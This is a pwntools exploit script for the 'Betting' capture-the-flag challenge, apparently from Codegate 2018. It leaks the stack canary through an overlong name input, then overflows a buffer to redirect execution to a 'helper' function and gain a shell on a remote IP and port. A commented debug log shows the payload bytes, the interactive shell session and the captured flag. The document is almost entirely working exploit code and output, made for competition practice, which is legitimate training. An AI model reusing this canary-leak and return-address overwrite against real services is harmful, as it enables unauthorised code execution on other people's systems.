# -*- coding: utf-8 -*-
from pwn import *

context.arch = "amd64"
# context.log_level = "DEBUG"


isRemote = True

e = ELF("./betting")
if isRemote:
    p = remote("110.10.147.29", 8282)
else:
    p = process("./betting")
    attach(p, "break *0x0000000000400AD3\nc")
    raw_input()


# leak canary
p.sendlineafter("name? ", "A"*0x18)
p.sendlineafter("with? ", "10000")

p.recvuntil("A"*0x18)

canary = u64(p.recv(8)) - 0x0a

print("[*] Canary is " + hex(canary) + "!")


# exploit!
p.sendlineafter("bet? ", "10000")

payload = ""

payload += "h"
payload += "A"*0x27

payload += p64(canary)

payload += "A"*8
payload += p64(e.symbols["helper"])

p.sendlineafter("for lower: ", payload)

p.interactive()

'''
shgroup@ubuntu:~/Desktop/codegate/pwnable/Betting$ python solve.py 
[DEBUG] PLT 0x40072c puts
[DEBUG] PLT 0x400740 __stack_chk_fail
[DEBUG] PLT 0x400750 system
[DEBUG] PLT 0x400760 printf
[DEBUG] PLT 0x400770 memset
[DEBUG] PLT 0x400780 read
[DEBUG] PLT 0x400790 __libc_start_main
[DEBUG] PLT 0x4007a0 srand
[DEBUG] PLT 0x4007b0 time
[DEBUG] PLT 0x4007c0 setvbuf
[DEBUG] PLT 0x4007d0 __isoc99_scanf
[DEBUG] PLT 0x4007e0 rand
[DEBUG] PLT 0x4007f0 __gmon_start__
[*] '/mnt/hgfs/Writeup/ctf/codegate/2018-Final/pwnable/Betting/betting'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 110.10.147.29 on port 8282: Done
[DEBUG] Received 0x13 bytes:
    'What is your name? '
[DEBUG] Sent 0x19 bytes:
    'AAAAAAAAAAAAAAAAAAAAAAAA\n'
[DEBUG] Received 0x2d bytes:
    'How much money would you like to start with? '
[DEBUG] Sent 0x6 bytes:
    '10000\n'
[DEBUG] Received 0x5b bytes:
    00000000  48 69 2c 20  41 41 41 41  41 41 41 41  41 41 41 41  │Hi, │AAAA│AAAA│AAAA│
    00000010  41 41 41 41  41 41 41 41  41 41 41 41  0a d4 3d 13  │AAAA│AAAA│AAAA│··=·│
    00000020  76 cf 48 aa  f0 0d 40 79  6f 75 20 68  61 76 65 20  │v·H·│··@y│ou h│ave │
    00000030  24 31 30 30  30 30 2e 0a  48 6f 77 20  6d 75 63 68  │$100│00.·│How │much│
    00000040  20 6d 6f 6e  65 79 20 64  6f 20 79 6f  75 20 77 61  │ mon│ey d│o yo│u wa│
    00000050  6e 74 20 74  6f 20 62 65  74 3f 20                  │nt t│o be│t? │
    0000005b
[*] Canary is 0xaa48cf76133dd400!
[DEBUG] Sent 0x6 bytes:
    '10000\n'
[DEBUG] Received 0x69 bytes:
    'You draw a Five of Hearts.\n'
    'Will the next card be higher or lower?\n'
    'Enter "h" for higher or "l" for lower: '
[DEBUG] Sent 0x41 bytes:
    00000000  68 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │hAAA│AAAA│AAAA│AAAA│
    00000010  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    00000020  41 41 41 41  41 41 41 41  00 d4 3d 13  76 cf 48 aa  │AAAA│AAAA│··=·│v·H·│
    00000030  41 41 41 41  41 41 41 41  f6 08 40 00  00 00 00 00  │AAAA│AAAA│··@·│····│
    00000040  0a                                                  │·│
    00000041
[*] Switching to interactive mode
[DEBUG] Received 0xa8 bytes:
    'You draw a Five of Hearts.\n'
    "I'll give you one more chance.\n"
    'Hi, AAAAAAAAAAAAAAAAAAAAAAAAyou have $10000.\n'
    'You draw a Five of Hearts.\n'
    'Will the next card be higher or lower?'
You draw a Five of Hearts.
I'll give you one more chance.
Hi, AAAAAAAAAAAAAAAAAAAAAAAAyou have $10000.
You draw a Five of Hearts.
Will the next card be higher or lower?[DEBUG] Received 0x28 bytes:
    '\n'
    'Enter "h" for higher or "l" for lower: '

Enter "h" for higher or "l" for lower: $ 
[DEBUG] Sent 0x1 bytes:
    '\n' * 0x1
$ h
[DEBUG] Sent 0x2 bytes:
    'h\n'
[DEBUG] Received 0xa8 bytes:
    'You draw a Eight of Clubs.\n'
    'Win! Congratulations AAAAAAAAAAAAAAAAAAAAAAAAYou win $10000!\n'
    'Hi, AAAAAAAAAAAAAAAAAAAAAAAAyou have $20000.\n'
    'How much money do you want to bet? '
You draw a Eight of Clubs.
Win! Congratulations AAAAAAAAAAAAAAAAAAAAAAAAYou win $10000!
Hi, AAAAAAAAAAAAAAAAAAAAAAAAyou have $20000.
How much money do you want to bet? $ 20000
[DEBUG] Sent 0x6 bytes:
    '20000\n'
[DEBUG] Received 0x6a bytes:
    'You draw a Eight of Spades.\n'
    'Will the next card be higher or lower?\n'
    'Enter "h" for higher or "l" for lower: '
You draw a Eight of Spades.
Will the next card be higher or lower?
Enter "h" for higher or "l" for lower: $ l
[DEBUG] Sent 0x2 bytes:
    'l\n'
[DEBUG] Received 0xa8 bytes:
    'You draw a Four of Spades.\n'
    'Win! Congratulations AAAAAAAAAAAAAAAAAAAAAAAAYou win $20000!\n'
    'Hi, AAAAAAAAAAAAAAAAAAAAAAAAyou have $40000.\n'
    'How much money do you want to bet? '
You draw a Four of Spades.
Win! Congratulations AAAAAAAAAAAAAAAAAAAAAAAAYou win $20000!
Hi, AAAAAAAAAAAAAAAAAAAAAAAAyou have $40000.
How much money do you want to bet? $ 40000
[DEBUG] Sent 0x6 bytes:
    '40000\n'
[DEBUG] Received 0x6a bytes:
    'You draw a Three of Hearts.\n'
    'Will the next card be higher or lower?\n'
    'Enter "h" for higher or "l" for lower: '
You draw a Three of Hearts.
Will the next card be higher or lower?
Enter "h" for higher or "l" for lower: $ l
[DEBUG] Sent 0x2 bytes:
    'l\n'
[DEBUG] Received 0xaa bytes:
    'You draw a Three of Hearts.\n'
    "I'll give you one more chance.\n"
    'Hi, AAAAAAAAAAAAAAAAAAAAAAAAyou have $40000.\n'
    'You draw a Three of Hearts.\n'
    'Will the next card be higher or lower?'
You draw a Three of Hearts.
I'll give you one more chance.
Hi, AAAAAAAAAAAAAAAAAAAAAAAAyou have $40000.
You draw a Three of Hearts.
Will the next card be higher or lower?[DEBUG] Received 0x28 bytes:
    '\n'
    'Enter "h" for higher or "l" for lower: '

Enter "h" for higher or "l" for lower: $ l
[DEBUG] Sent 0x2 bytes:
    'l\n'
[DEBUG] Received 0xa7 bytes:
    'You draw a Two of Hearts.\n'
    'Win! Congratulations AAAAAAAAAAAAAAAAAAAAAAAAYou win $40000!\n'
    'Hi, AAAAAAAAAAAAAAAAAAAAAAAAyou have $80000.\n'
    'How much money do you want to bet? '
You draw a Two of Hearts.
Win! Congratulations AAAAAAAAAAAAAAAAAAAAAAAAYou win $40000!
Hi, AAAAAAAAAAAAAAAAAAAAAAAAyou have $80000.
How much money do you want to bet? $ 80000
[DEBUG] Sent 0x6 bytes:
    '80000\n'
[DEBUG] Received 0x68 bytes:
    'You draw a Six of Hearts.\n'
    'Will the next card be higher or lower?\n'
    'Enter "h" for higher or "l" for lower: '
You draw a Six of Hearts.
Will the next card be higher or lower?
Enter "h" for higher or "l" for lower: $ l
[DEBUG] Sent 0x2 bytes:
    'l\n'
[DEBUG] Received 0xce bytes:
    'You draw a Six of Hearts.\n'
    "I'll give you one more chance.\n"
    'Hi, AAAAAAAAAAAAAAAAAAAAAAAAyou have $80000.\n'
    'You draw a Six of Hearts.\n'
    'Will the next card be higher or lower?\n'
    'Enter "h" for higher or "l" for lower: '
You draw a Six of Hearts.
I'll give you one more chance.
Hi, AAAAAAAAAAAAAAAAAAAAAAAAyou have $80000.
You draw a Six of Hearts.
Will the next card be higher or lower?
Enter "h" for higher or "l" for lower: $ l
[DEBUG] Sent 0x2 bytes:
    'l\n'
[DEBUG] Received 0x93 bytes:
    'You draw a Jack of Clubs.\n'
    'LOSE!!! Too bad AAAAAAAAAAAAAAAAAAAAAAAAYou lose $80000.\n'
    'Too bad AAAAAAAAAAAAAAAAAAAAAAAAYou are out of money! You lose.\n'
You draw a Jack of Clubs.
LOSE!!! Too bad AAAAAAAAAAAAAAAAAAAAAAAAYou lose $80000.
Too bad AAAAAAAAAAAAAAAAAAAAAAAAYou are out of money! You lose.
$ 
[DEBUG] Sent 0x1 bytes:
    '\n' * 0x1
$ ls
[DEBUG] Sent 0x3 bytes:
    'ls\n'
[DEBUG] Received 0xd bytes:
    'betting\n'
    'flag\n'
betting
flag
$ cat flag
[DEBUG] Sent 0x9 bytes:
    'cat flag\n'
[DEBUG] Received 0x53 bytes:
    'flag{L1fe consists n0t 1n h0lding good cards but in playing those you h0ld well:)}\n'
flag{L1fe consists n0t 1n h0lding good cards but in playing those you h0ld well:)}
[*] Got EOF while reading in interactive
$ 
[*] Interrupted
[*] Closed connection to 110.10.147.29 port 8282
'''
